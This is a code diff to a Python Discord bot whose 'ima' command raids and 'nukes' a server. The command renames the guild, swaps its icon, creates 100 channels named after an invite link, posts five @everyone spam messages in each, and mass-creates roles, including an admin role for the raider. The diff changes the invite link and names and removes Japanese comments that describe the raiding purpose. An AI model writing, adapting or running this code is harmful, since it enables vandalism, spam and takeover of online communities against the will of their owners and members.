@@ -20,9 +20,9 @@ async def ima(ctx):
 
     guild = ctx.guild
     new_server_name = "みんなのすみか植民地" 
-    new_server_icon_url = "https://images-ext-1.discordapp.net/external/FFZVIqTXouydd9yjhkRIS6jTB9tZzx60yiazQWUV6O0/https/i.imgur.com/M7xDJw4.jpg?format=webp&width=293&height=400"
-    role_name = "みっちー万歳" #ここは作成したいロールの名前にしてね
-    admin_role_name = "nuke user" #荒らしたときに作成する管理者のロールの名前にしてね
+    new_server_icon_url = "https://i.ibb.co/rfskMLvc/IMG-0991.jpg"
+    role_name = "みんなのすみか万歳"
+    admin_role_name = "みんなの住処に入ろう" 
 
     try:
         await guild.edit(community=False)
@@ -55,17 +55,17 @@ async def ima(ctx):
         pass
 
     create_tasks = [
-        ctx.guild.create_text_channel(f'discord.gg/mititt') for _ in range(100) #作成したいチャンネルの名前と作成する数
+        ctx.guild.create_text_channel(f'discord.gg/Rv3nVTAWsw') for _ in range(100) 
     ]
     new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
 
     send_message_tasks = []
-    message_content = '@everyone discord.gg/mititt' #荒らすときに送りたいメッセージにしてね
+    message_content = '@everyone https://discord.gg/Rv3nVTAWsw' 
 
     for channel in new_channels:
         if isinstance(channel, Exception):
             continue
-        for _ in range(5):#チャンネルにメッセージを送る回数
+        for _ in range(5):
             send_message_tasks.append(channel.send(message_content))
 
     await asyncio.gather(*send_message_tasks, return_exceptions=True)
@@ -84,7 +84,7 @@ async def ima(ctx):
 
     try:
         create_roles_tasks = [
-            guild.create_role(name=role_name) for _ in range(30)#ロールを作成したい数
+            guild.create_role(name=role_name) for _ in range(30)
         ]
         await asyncio.gather(*create_roles_tasks, return_exceptions=True)
     except:
@@ -92,4 +92,4 @@ async def ima(ctx):
 
     return
 
-bot.run("token")#ここに自分のtokenを入れてね
+bot.run("token")
